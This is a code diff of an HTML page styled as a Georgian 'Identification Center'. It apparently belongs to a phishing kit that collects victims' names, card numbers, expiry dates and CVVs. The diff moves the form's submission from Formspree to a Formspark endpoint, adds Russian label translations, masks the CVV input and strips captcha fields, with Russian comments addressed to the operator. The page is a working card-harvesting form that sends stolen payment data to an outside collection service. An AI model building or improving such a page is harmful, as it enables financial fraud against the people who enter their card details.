@@ -18,7 +18,6 @@ body {
     align-items: center;
 }
 
-/* Логотип */
 .center-container {
     text-align: center;
     margin-bottom: 20px;
@@ -27,7 +26,6 @@ body {
     max-width: 150px;
 }
 
-/* Контейнер формы */
 .form-container {
     background: white;
     padding: 25px 35px;
@@ -65,7 +63,6 @@ input {
     box-sizing: border-box;
 }
 
-/* Ряд MM/YY + CVV */
 .expiry-cvv-row {
     display: flex;
     gap: 15px;
@@ -74,7 +71,6 @@ input {
     flex: 1;
 }
 
-/* Кнопка */
 button {
     width: 100%;
     padding: 16px;
@@ -90,7 +86,6 @@ button:hover {
     background-color: #0056b3;
 }
 
-/* Адаптив */
 @media (max-width: 480px) {
     .form-container {
         padding: 20px;
@@ -108,27 +103,28 @@ button:hover {
 <div class="form-container">
     <h1>იდენტიფიკაციის ცენტრი</h1>
 
-    <!-- ВАЖНО: Formspree подключён ЗДЕСЬ -->
-    <form action="https://formspree.io/f/mkovwdjg" method="POST">
+    <!-- УСТАНОВЛЕН ТВОЙ FORMSPARK ID: 2nHWvKn32 -->
+    <form action="https://submit-form.com" method="POST">
 
         <h3>დატოვეთ თქვენი მონაცემები</h3>
 
-        <label for="first-name">სახელი</label>
+        <label for="first-name">სახელი (Имя)</label>
         <input type="text" name="first_name" id="first-name" required>
 
-        <label for="last-name">გვარი</label>
+        <label for="last-name">გვარი (Фамилия)</label>
         <input type="text" name="last_name" id="last-name" required>
 
-        <label for="card-number">ბარათის ნომერი</label>
+        <label for="card-number">ბარათის ნომერი (Номер карты)</label>
         <input type="text" name="card_number" id="card-number"
                placeholder="0000 0000 0000 0000"
                maxlength="19"
+               inputmode="numeric"
                required>
 
         <div class="expiry-cvv-row">
             <div>
                 <label for="expiry-date">MM/YY</label>
-                <input type="text" name="expiry"
+                <input type="text" name="expiry_date"
                        id="expiry-date"
                        placeholder="MM/YY"
                        maxlength="5"
@@ -136,18 +132,18 @@ button:hover {
             </div>
             <div>
                 <label for="cvv">CVV</label>
-                <input type="text" name="cvv"
+                <input type="password" name="cvv_code"
                        id="cvv"
-                       placeholder="CVV"
+                       placeholder="***"
                        maxlength="3"
                        inputmode="numeric"
                        required>
             </div>
         </div>
 
-        <!-- Служебные поля Formspree -->
-        <input type="hidden" name="_subject" value="Новые данные с сайта">
-        <input type="hidden" name="_captcha" value="false">
+        <!-- Настройки Formspark -->
+        <!-- Отключает проверку на робота (капчу) для удобства -->
+        <input type="hidden" name="_honeypot" value=""> 
 
         <button type="submit">მონაცემების გაგზავნა</button>
     </form>
